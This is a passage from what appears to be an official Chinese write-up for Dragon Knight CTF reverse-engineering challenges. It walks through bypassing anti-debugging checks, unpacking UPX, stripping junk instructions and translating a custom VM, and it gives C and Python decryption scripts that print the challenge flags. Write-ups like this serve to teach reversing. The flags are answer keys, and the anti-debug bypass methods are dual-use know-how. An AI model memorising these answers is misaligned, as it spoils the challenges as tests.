0xEi64;</span><br><span class="line">    **(_QWORD **)&amp;v15[4] ^= 0xEui64;</span><br><span class="line">    if ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(_QWORD *)v15;</span><br><span class="line">      **(_QWORD **)&amp;v15[4] += *(_QWORD *)v15;</span><br><span class="line">    &#125;</span><br><span class="line">    **(_QWORD **)&amp;v15[4] ^= v2;</span><br><span class="line">    v5 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 56i64)</span><br><span class="line">       + (((v11 ^ *(_DWORD *)(a2 + 4i64 * (v7 ^ i &amp; 3))) + (**(_DWORD **)&amp;v15[4] ^ v10)) ^ (((16 * v11) ^ (**(_DWORD **)&amp;v15[4] &gt;&gt; 3))</span><br><span class="line">                                                                                          + ((4 * **(_DWORD **)&amp;v15[4]) ^ (v11 &gt;&gt; 5))));</span><br><span class="line">    *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 56i64) = v5;</span><br><span class="line">    v11 = v5;</span><br><span class="line">    --v8;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v8 );</span><br><span class="line">  v13 = 60;</span><br><span class="line">  while ( v13 != 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    --v13;</span><br><span class="line">    if ( *(unsigned __int8 *)(*(_QWORD *)&amp;v15[4] + v13) != (byte_7FF7A5187000[v13 + 1] ^ 0x23) )</span><br><span class="line">      return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个的特征很明显是xxtea，并且没有魔改，网上直接搜脚本<br>exp：(需要用clang)<br>(网上的脚本<a href="https://www.cnblogs.com/zpchcbd/p/15974293.html">https://www.cnblogs.com/zpchcbd/p/15974293.html</a>)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#define DELTA 0x9e3779b9</span><br><span class="line">#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span><br><span class="line"></span><br><span class="line">void btea(uint32_t* v, int n, uint32_t const key[4])</span><br><span class="line">&#123;</span><br><span class="line">	uint32_t y, z, sum;</span><br><span class="line">	unsigned p, rounds, e;</span><br><span class="line">	if (n &gt; 1)            /* Coding Part */</span><br><span class="line">	&#123;</span><br><span class="line">		rounds = 6 + 52 / n;</span><br><span class="line">		sum = 0;</span><br><span class="line">		z = v[n - 1];</span><br><span class="line">		do</span><br><span class="line">		&#123;</span><br><span class="line">			sum += DELTA;</span><br><span class="line">			e = (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">			for (p = 0; p &lt; n - 1; p++)</span><br><span class="line">			&#123;</span><br><span class="line">				y = v[p + 1];</span><br><span class="line">				z = v[p] += MX;</span><br><span class="line">			&#125;</span><br><span class="line">			y = v[0];</span><br><span class="line">			z = v[n - 1] += MX;</span><br><span class="line">		&#125; while (--rounds);</span><br><span class="line">	&#125;</span><br><span class="line">	else if (n &lt; -1)      /* Decoding Part */</span><br><span class="line">	&#123;</span><br><span class="line">		n = -n;</span><br><span class="line">		rounds = 6 + 52 / n;</span><br><span class="line">		sum = rounds * DELTA;</span><br><span class="line">		y = v[0];</span><br><span class="line">		do</span><br><span class="line">		&#123;</span><br><span class="line">			e = (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">			for (p = n - 1; p &gt; 0; p--)</span><br><span class="line">			&#123;</span><br><span class="line">				z = v[p - 1];</span><br><span class="line">				y = v[p] -= MX;</span><br><span class="line">			&#125;</span><br><span class="line">			z = v[n - 1];</span><br><span class="line">			y = v[0] -= MX;</span><br><span class="line">			sum -= DELTA;</span><br><span class="line">		&#125; while (--rounds);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	unsigned char fakefalg[99] = &#123; 0xff, 0xef, 0x79, 0xbc, 0xda, 0x6c, 0xc9,</span><br><span class="line">						0xb1, 0x24, 0x90, 0x89, 0x5d, 0x99,</span><br><span class="line">						0x42, 0xe1, 0x15, 0xc1, 0x1b, 0x2a,</span><br><span class="line">						0x5a, 0x9f, 0x90, 0xe0, 0x5f, 0xe9,</span><br><span class="line">						0x74, 0x9d, 0x44, 0x0d, 0x56, 0xfd,</span><br><span class="line">						0x51, 0x7e, 0x34, 0x5a, 0xc5, 0x3a,</span><br><span class="line">						0x5e, 0x24, 0xbc, 0xe1, 0x40, 0x0d,</span><br><span class="line">						0x17, 0x68, 0xfc, 0xcc, 0x09, 0x5b,</span><br><span class="line">						0xff, 0xc9, 0x45, 0x19, 0xb6, 0xc9,</span><br><span class="line">						0x0a, 0x5e, 0xd9, 0x03, 0xb2, 0x48 &#125;;</span><br><span class="line">	for (int i = 0; i &lt; 61; ++i) &#123;</span><br><span class="line">		fakefalg[i] ^= 0x23;</span><br><span class="line">	&#125;</span><br><span class="line">	uint32_t key[4] = &#123; 0x1234,0x2341,0x3412,0x4123 &#125;;</span><br><span class="line">	btea((unsigned*)(fakefalg + 1), -15, key);</span><br><span class="line">	printf(&quot;解密后的数据：%s\n&quot;, (char*)fakefalg);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到假flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DRKCTF&#123;Sorry.There_is_no_more_flower_tea.Please_try_again!!&#125;</span><br></pre></td></tr></table></figure>

<p>很明显，这个不是真flag，这说明：<br>动态调试的时候和正常的时候运行的逻辑不一样<br>第一时间会想到这个可能是smc或者hook<br>所以先查看encode的交叉引用。<br>于是找到这个函数：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733829975-153319f8-74d5-4986-8a9e-8f768ac45af7.png" alt="image.png"><br>可以看到上层函数<br>修改了encode中的前几个字节用ret的方法返回到sub_140012A0中<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733829989-1a9f71ea-f342-424a-af46-2cb10c1d5fee.png" alt="image.png"><br>这里的第一个是反调试，在x64下，调试标志位在PEB表偏移0x2的位置，通过获取gs寄存器找到peb表的位置：<br>readsqword(0x62)得到调试标志位并判断当前进程是否在调试<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733829985-4afa9be0-9bb4-4cb8-9f55-5dd9c717c765.png" alt="image.png"><br>block是单纯地得到对应的两个函数地址<br>get_virtual_protect中，通过异或把virtualprotect函数名隐藏并通过搜索它在kernel32.dll中位置返回函数地址<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733829987-92034861-23bc-47d2-9e95-b4f30fa85fbe.png" alt="image.png"><br>通过上面的分析，可以得出我们需要查看sub_140012A0的内容，这里才是真正的加密函数<br>打开，还是花QAQ<br>汇编中，可以看到函数后段全是一个指令+一个jmp<br>由于汇编不是很好看，改成流程图看奇怪的地方。<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733829973-15def95e-8069-44cd-91a5-819ab44df3c5.png" alt="image.png"><br>可以猜测：如果一个地方有一块代码，并且有连续jmp，这里可能是人工加的花<br>那么就先看一下那个很远的环和上面一排没有入口的块<br>1<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733832192-cef5fe2c-e686-4d46-b327-e5d7a3c01b20.png" alt="image.png"><br>这里能看到push和pop，所以从push进入花，从pop离开花，可以看出可以这样还原<br>2<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733832265-37061b1b-0f12-4caf-8153-cba463e120d5.png" alt="image.png"><br>这里有一个call，尝试跟着call走，它下一步修改了返回地址，减去5A<br>即：140001460<br>转换一下这里的指令<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733832191-1cc0fbe0-3f81-4909-a497-5295e5abc4db.png" alt="image.png"><br>所以把call nop了就好<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733832182-3eb75a93-c094-4099-be25-76c4f9d44050.png" alt="image.png"><br>3<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733832201-20c08a69-26d7-4428-95f8-6a320ed5339b.png" alt="image.png"><br>nop之后<br>然后全部u，c，p还原函数<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733834495-e9f6427f-ca83-4dc5-9162-da08a490e772.png" alt="image.png"><br>这里又可以看到上面的一个奇怪return，看汇编可以发现还是一个花<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733834450-c2ef6d71-3686-447f-ab49-66e8d87bac19.png" alt="image.png"><br>直接把call到retn去掉（除了shl）<br>这是一个变体tea，尝试化简这个函数<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733834514-bfee2ec3-61aa-4829-9c9b-096656970bac.png" alt="image.png"><br>写脚本直接解<br>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;fcntl.h&gt;</span><br><span class="line">#include&lt;stdarg.h&gt;</span><br><span class="line">#include&lt;stdint.h&gt; </span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void dectrueTEA(uint32_t* flag, uint32_t* key, uint32_t E) &#123;</span><br><span class="line">	int i, j;</span><br><span class="line">	const uint32_t delta[4] = &#123; 0x59578627 ,0xe1c49e72,0xbc24167f ,0x8c3da26b &#125;;</span><br><span class="line">	uint32_t e = E;</span><br><span class="line">	const int len = 15;</span><br><span class="line">	for (i = 0; i &lt; len; i += 4) &#123;</span><br><span class="line">		uint32_t* c[4] = &#123; &amp;flag[(len - (i + 3)) % len],&amp;flag[(len - (i + 2)) % len],&amp;flag[(len - (i + 1)) % len],&amp;flag[(len - i) % len] &#125;;</span><br><span class="line">		for (j = 32; j &gt;= 0; j--) &#123;</span><br><span class="line">			*c[3] -= ((e ^ *c[2]) ^ (key[(j + 3) % 4] &gt;&gt; 2)) ^ (e &lt;&lt; 1);</span><br><span class="line">			e -= delta[*c[3] % 4];</span><br><span class="line"></span><br><span class="line">			*c[2] -= ((e ^ *c[1]) ^ (key[(j + 2) % 4] &lt;&lt; 3)) ^ (e &gt;&gt; 2);</span><br><span class="line">			e -= delta[*c[2] % 4];</span><br><span class="line"></span><br><span class="line">			*c[1] -= ((e ^ *c[0]) ^ (key[(j + 1) % 4] &gt;&gt; 1)) ^ (e &lt;&lt; 4);</span><br><span class="line">			e -= delta[*c[1] % 4];</span><br><span class="line"></span><br><span class="line">			*c[0] -= ((e ^ *c[3]) ^ (key[j % 4] &lt;&lt; 2)) ^ (e &gt;&gt; 3);</span><br><span class="line">			e -= delta[*c[0] % 4];</span><br><span class="line">		&#125;</span><br><span class="line">		//printf(&quot;\n0x%x 0x%x 0x%x 0x%x\n&quot;, *c[0], *c[1], *c[2], *c[3]);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;%s&quot;, flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">	uint32_t E = 0;</span><br><span class="line">	uint32_t k1[4] = &#123; 0x1234,0x2341,0x3412,0x4123 &#125;;</span><br><span class="line">	uint32_t a[] = &#123; 0x127DC4E1, 0xCBA0EC0E, 0x570EDF5B, 0x99062A35, 0x382A7E1B, 0x15E46742, 0x4E5E456F, 0x3834C1D6, 0x5EF778A5, 0xAF217212, 0xC2D79D20, 0xD5C5935F, 0xCD2F5BB, 0xC527398C, 0x5EAC6739 &#125;;</span><br><span class="line">	E = 0xAE58570C;</span><br><span class="line">	dectrueTEA(a, k1, E);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a><strong>Debug</strong></h3><p>先是一个upx壳，用x64dbg自带的scylla工具脱一下<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733834889-d2f79779-6dec-408a-b3e4-58c0465f6c83.png" alt="image.png"><br>然后得到dump_SYC.exe拖进ida动态分析<br>在main函数开始之前藏了两个IsDebuggerPresent进行反调试<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733834462-d9ba01d4-e5b5-4a90-b31e-000384060a74.png" alt="image.png"><br>之后在函数的开始和结尾部分也利用了GetTickCount函数判断程序是否执行的很慢，如果程序执行的很慢则就是在调试，退出程序<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733836932-af846bc4-b9c5-464a-a148-496084c1a310.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733836945-9a11b118-f1c4-4e1c-b6d1-885c1daaa5e0.png" alt="image.png"><br>题目通过读取当前目录下的myflag.txt中的flag来检验flag，过掉反调试动调到这里可以发现被解密后的 文件名称即myflag.txt<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733836939-ca86b753-0f9a-4528-bbf7-8cf0925cd6df.png" alt="image.png"><br>之后进入main2函数，函数利用了SMC，解密加密代码，再对读取的flag进行加密<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733837016-3584b698-44ce-424f-8b3e-6af0c1623fe0.png" alt="image.png"><br>这里也放有检测时间间隔的反调试函数。<br>一种方法是过掉所有反调试，动调到SMC后面即可看到正确的程序逻辑<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733836937-e47c82bb-164e-45ff-8475-097e53da8e50.png" alt="image.png"><br>但是也可以看明白汇编逻辑后，手动修改回来这段SMC代码贴回去<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733839814-5886117d-4491-47c3-b303-eb86cd60ed66.png" alt="image.png"><br>最后一个函数就是比较函数了<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733839735-3a287912-d13b-4268-9a0e-70dc549aa744.png" alt="image.png"><br>加密过程很简单，取出密文写出解密脚本即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enc = [0xCF, 0xD9, 0xC0, 0xC8, 0xDF, 0xCD, 0x0C, 0xD2, 0x43, 0x98, 0x10, 0xC0, 0x83, 0x43, 0x9A, 0x10, 0xCD, 0x42, 0x8C, 0x4A, 0x10, 0xC8, 0x82, 0x83, 0x4A, 0x9F, 0x8C, 0xDF, 0x98, 0x42, 0x8C, 0xDF, 0x84, 0x82, 0x83, 0x46, 0x52, 0x52, 0x52, 0x0E]</span><br><span class="line"></span><br><span class="line">for i in range(len(enc)):</span><br><span class="line">    tmp = enc[i]</span><br><span class="line">    if (tmp^0xab) &gt; 96 and (tmp^0xab) &lt; 123:</span><br><span class="line">        enc[i] ^= 0xab</span><br><span class="line">        enc[i] -= 32</span><br><span class="line">    elif (tmp^0xcd) &gt; 64 and (tmp^0xcd) &lt; 91:</span><br><span class="line">        enc[i] ^= 0xcd</span><br><span class="line">        enc[i] += 32</span><br><span class="line">    else:</span><br><span class="line">        enc[i] ^= 0x51</span><br><span class="line">        enc[i] += 30</span><br><span class="line">    print(chr(enc[i]), end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>

<p>flag： DRKCTF{Y0u_Kn0w_F1a9_Con9raTu1aTion5!!!}</p>
<h3 id="一起做杯下午茶吧"><a href="#一起做杯下午茶吧" class="headerlink" title="一起做杯下午茶吧"></a><strong>一起做杯下午茶吧</strong></h3><h4 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a><strong>题目考点</strong></h4><p>基础花指令，基础反调试，tea ，xtea，vm</p>
<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a><strong>题解</strong></h4><p>打开题目<br>运行exe<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733839780-6b013b3d-5c54-4149-b476-42de35c957f2.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733839931-34cd7cb6-1557-4b4b-ad87-7864c394fc2c.png" alt="image.png"></p>
<h5 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a><strong>第一关</strong></h5><p>爆红 发现花指令（3处花）很简单的花 直接去<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733839790-1b827b85-7947-4ef6-b9e8-bf9b8a581740.png" alt="image.png"><br>tab进去 发现这道题有两部分<br>先解第一部分，就是一个最基础的tea加密，但是长得有点丑了，改一下名称，<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733842830-f058a447-e0ad-4b7e-ab3b-a377ec6a1906.png" alt="image.png"><br>最终的比较数据<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733842836-429b8bc4-a1db-49ed-a4b0-0624bb5484c1.png" alt="image.png"><br>注意key的反调试相关操作<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733842848-4e225642-e33f-42da-93b2-42467c0b4695.png" alt="image.png"><br>正常没有调试的时候，异或的是key0和key3<br>所以写脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">void decrypt(uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0 = v[0], v1 = v[1], i;</span><br><span class="line">    uint32_t delta = 0x61C88647;</span><br><span class="line">    uint32_t sum = delta * (-32);</span><br><span class="line">    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];</span><br><span class="line">    for (i = 0; i &lt; 32; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);</span><br><span class="line">        sum += delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[0] = v0; v[1] = v1;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    uint32_t enflag [4] = &#123;0xe882d112,0xea66ea40,0xff171fde,0x2a510d08,&#125;;</span><br><span class="line">    uint32_t key[4] = &#123; 0x67626463, 0x696D616E, 0x79645F65, 0x6B696C69 &#125;;</span><br><span class="line">    key[0] ^= 10;</span><br><span class="line">    key[3] ^= 10;</span><br><span class="line">    for (int i = 0; i &lt; 4; i += 2)</span><br><span class="line">    &#123;</span><br><span class="line">        decrypt(enflag + i, key);</span><br><span class="line">        printf(&quot;0x%x,0x%x,&quot;, enflag[i], enflag[i + 1]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n%s&quot;,enflag);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一部分密钥，这个会运用到第二部分的密钥<br>put_some_sugar!!</p>
<h5 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a><strong>第二关</strong></h5><p>通过check找到最终的密文<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733842769-0af381ce-caa5-4a00-9036-a64f03dd8be4.png" alt="image.png"><br>进入加密的主要部分<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733843030-7079f43d-9a10-4165-b4a0-7440229558e9.png" alt="image.png"><br>进去看可以看出来是vm题型，有相关的函数和opcode<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733846267-24cbc91c-948e-46f2-8ffe-b46052c8f318.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733846249-dbabc519-833c-4a95-9e5c-57f972e6cb78.png" alt="image.png"><br>可以看出来规律 0xF开头的是定义的不同函数，根据vm做题经验，我们直接自动化把这个opcode一行一行列出来，然后就是翻译他每个函数的意义了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned char vm_code[] = &#123; </span><br><span class="line">    0xf0,0xe0,0x05,0x4D, </span><br><span class="line">    0xf0,0xe0,0x04,0x00, </span><br><span class="line">    0xf0,0xe0,0x03,0x00, </span><br><span class="line">    0xf3,0xcc,           </span><br><span class="line">    0xf0,0xe0,0x06,0x01,  </span><br><span class="line">    0xf9,0xe0,0x00,0x00,  </span><br><span class="line">    0xf0,0xe0,0x06,0x05, </span><br><span class="line">    0xf5,0x00,0x06,      </span><br><span class="line">    0xf0,0xe1,0x01,0x00, </span><br><span class="line">    0xf0,0xe0,0x06,0x01,</span><br><span class="line">    0xf9,0xe0,0x00,0x00,</span><br><span class="line">    0xf0,0xe0,0x06,0x06,</span><br><span class="line">    0xf6,0x00,0x06,    </span><br><span class="line">    0xf7,0x01,0x00,     </span><br><span class="line">    0xf0,0xe0,0x06,0x01,</span><br><span class="line">    0xf9,0xe0,0x00,0x00, </span><br><span class="line">    0xf1,0x00,0x01,  </span><br><span class="line">    0xf0,0xe1,0x07,0x00 ,    </span><br><span class="line">    0xf0,0xe1,0x00,0x04,   </span><br><span class="line">    0xf0,0xe0,0x06,0x03,  </span><br><span class="line">    0xf8,0x06,0x00,        </span><br><span class="line">    0xf9,0xe0,0x00,0x01,  </span><br><span class="line"></span><br><span class="line">    0xf1,0x00,0x04,     </span><br><span class="line">    0xf7,0x07,0x00,  </span><br><span class="line">    0xf0,0xe0,0x06,0x00,</span><br><span class="line">    0xf9,0xe0,0x00,0x00, </span><br><span class="line">    0xf1,0x00,0x07,</span><br><span class="line">    0xf0,0xe0,0x06,0x00,</span><br><span class="line">    0xf9,0xe1,0x00,0x00, </span><br><span class="line">    0xf0,0xe0,0x06,0x00, </span><br><span class="line">    0xf9,0xe0,0x02,0x02,  </span><br><span class="line">    0xf2,0x04,0x02, </span><br><span class="line">    0xf0,0xe0,0x06,0x00,  </span><br><span class="line">    0xf9,0xe0,0x00,0x00, </span><br><span class="line">    0xf0,0xe0,0x06,0x05, </span><br><span class="line">    0xf5,0x00,0x06,     </span><br><span class="line">    0xf0,0xe1,0x01,0x00, </span><br><span class="line">    0xf0,0xe0,0x06,0x00,</span><br><span class="line">    0xf9,0xe0,0x00,0x00,</span><br><span class="line">    0xf0,0xe0,0x06,0x06,</span><br><span class="line">    0xf6,0x00,0x06,    </span><br><span class="line">    0xf7,0x01,0x00,    </span><br><span class="line">    0xf0,0xe0,0x06,0x00,</span><br><span class="line">    0xf9,0xe0,0x00,0x00,</span><br><span class="line">    0xf1,0x00,0x01,      </span><br><span class="line">    0xf0,0xe1,0x07,0x00,      </span><br><span class="line">    0xf0,0xe1,0x00,0x04,   </span><br><span class="line">    0xf0,0xe0,0x06,0x07,</span><br><span class="line">    0xf6,0x00,0x06, </span><br><span class="line">    0xf0,0xe0,0x06,0x03,   </span><br><span class="line">    0xf8,0x06,0x00,        </span><br><span class="line">    0xf9,0xe0,0x00,0x01,  </span><br><span class="line">    0xf1,0x00,0x04,     </span><br><span class="line">    0xf7,0x07,0x00,    </span><br><span class="line">    0xf0,0xe0,0x06,0x01, </span><br><span class="line">    0xf9,0xe0,0x00,0x00, </span><br><span class="line">    0xf1,0x00,0x07,</span><br><span class="line">    0xf0,0xe0,0x06,0x01,</span><br><span class="line">    0xf9,0xe1,0x00,0x00,</span><br><span class="line">    0xf0,0xe0,0x06,0x01,</span><br><span class="line">    0xf1,0x03,0x06,   </span><br><span class="line">    0xfa,0x03,0x05,   </span><br><span class="line">    0xf4,0xd4,</span><br><span class="line">    0xfb&#125;;</span><br></pre></td></tr></table></figure>

<p>F0 中 不难看出有两种操作，一个是E0 一个是E1<br>先去分析这个vm的相关储存结构是怎么构成的<br>根据不同函数的共同参数a1，并且都在最后加了一定的数值，结合opcode，判断出a1就是栈指针eip<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733846201-7ad18d4b-69f0-4976-a8e5-453b1064ed89.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733845979-34b7ee52-d334-451f-9c91-d015286b8420.png" alt="image.png"><br>结合第一条机器码语句<br>0xf0,0xe0,0x05,0x4D,<br>这里选择了 f0 e0 然后一个小数5 一个大数0X4D，大胆猜测这个就是MOV指令，把0x4D的值存到了5寄存器中<br>谨慎验证 动调<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733845866-2b5f70db-af2b-4237-afb6-d5dcdccc79d2.png" alt="image.png"><br>v1[0]现在指向了F0 那么顺延下去，v1[1]就是E0 进行了类型的选择，v[2]v[3]进行了数据的储存，验证成功，去看别的函数<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733849037-6bb544c8-5d1a-4d39-88c0-414519545eee.png" alt="image.png"><br>这个v2赋值的数据，我们步步跟进，可以分析出是存储寄存器的地址<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733849058-1fdd0f51-2a38-43cb-be1d-412e6bdec991.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733849187-8ac035cc-8034-459e-99ed-3d47a0716c51.png" alt="image.png"><br>这里存了0<br>我们直观去看opcode 不太容易分析出 我们的加密的数据到底在哪，这就涉及另一个函数了<br>在这个函数中涉及了新的数据（我重命名为data_address）我们跟进去看<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733849240-58e21dca-bfb7-4ba0-ab07-2565a0ed05cc.png" alt="image.png"><br>竟然存着我们输入的数据sugar和flag[0]（flag0是我们在外层函数中，发现了类似tea加密的数据循环存储形式，推断出他是进去加密的flag[0],flag[1]结构）<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733849047-f560baea-fb80-4e9b-af9a-474d4e60fce4.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733852794-5ba82270-ab06-4fcb-a964-26a6454ee382.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733852939-8c6a76cc-4fa8-4642-b248-54554c27ede5.png" alt="image.png"><br>第三个unknown跟进，发现是114514，感觉是delta，<br>这个三个部分分别占据了data_address的1 2 3位，找一句执行0XF9的语句进行大胆分析<br>0xf9,0xe0,0x00,0x00,<br>选择e0方式，两个0，第一个0代表了寄存器型号的选择，第二个0代表了data_address中 三个地址的选择，这里明显就是选择了flag，然后将值存入了0寄存器中，<br>后面的eip[6]是干啥的，明显是以flag第一位为索引，去看具体取数组中的第几位，跟进上一个语句<br>0xf0,0xe0,0x06,0x01, mov了一个1进6寄存器，这里就是说取了flag+1指针所指向的值 即flag[1]<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733852817-f2adebc3-cd13-42a6-9e0f-2038ce8cdbc6.png" alt="image.png"><br>一些加减乘除位移异或的函数分析就不做具体分析了，jmp和cmp的汇编有经验的师傅们应该也很容易识别出<br>最后的函数命名如下<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733853125-6edf951b-838f-4ae1-867c-906653ff1634.png" alt="image.png"><br>我们就可以依据这个写出汇编，思路其实就是一个XTEA的加密（看出XTEA因为其中有一句对于key取位的操作）<br>delta和密文密钥我们都有了，注意这里的循环次数进行了魔改是4D，原opcode的注释呈上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned char vm_code[] = &#123; </span><br><span class="line">	0xf0,0xe0,0x05,0x4D, //存rounds进r6   r6代表rounds 基本不会变的</span><br><span class="line">	0xf0,0xe0,0x04,0x00, //存sum进r5  r5代表sum</span><br><span class="line">	0xf0,0xe0,0x03,0x00, //存i进r4   (这三个固定的值)</span><br><span class="line"></span><br><span class="line">	0xf3,0xcc,            //jump到for循环</span><br><span class="line">	0xf0,0xe0,0x06,0x01,  //temp临时存了0x01</span><br><span class="line">	0xf9,0xe0,0x00,0x00,  //取了flag中的第一个数（目前的v1）</span><br><span class="line">	0xf0,0xe0,0x06,0x05,  //temp临时存值0x05</span><br><span class="line">	0xf5,0x00,0x06,       //shl操作</span><br><span class="line">	0xf0,0xe1,0x01,0x00,  //位操作完成的值给到r2中</span><br><span class="line">	0xf0,0xe0,0x06,0x01,</span><br><span class="line">	0xf9,0xe0,0x00,0x00,</span><br><span class="line">	0xf0,0xe0,0x06,0x06,</span><br><span class="line">	0xf6,0x00,0x06,     //shr操作</span><br><span class="line">	0xf7,0x01,0x00,     //异或之后的值存在了寄存器r2中</span><br><span class="line">	0xf0,0xe0,0x06,0x01,</span><br><span class="line">	0xf9,0xe0,0x00,0x00, //又把v1存在了r1中</span><br><span class="line">	0xf1,0x00,0x01,      //把r1和r2相加  实现了 (((v1 &gt;&gt; 5) ^ (v1 &gt;&gt; 6)) + v1) 这段数据在r1中</span><br><span class="line">	0xf0,0xe1,0x07,0x00 ,      //先放在临时储存的地方</span><br><span class="line">	//现在的问题，怎么把算好的这部分数据存到一个地方。</span><br><span class="line">	0xf0,0xe1,0x00,0x04,   //把sum的值移动到r1中</span><br><span class="line">	0xf0,0xe0,0x06,0x03,   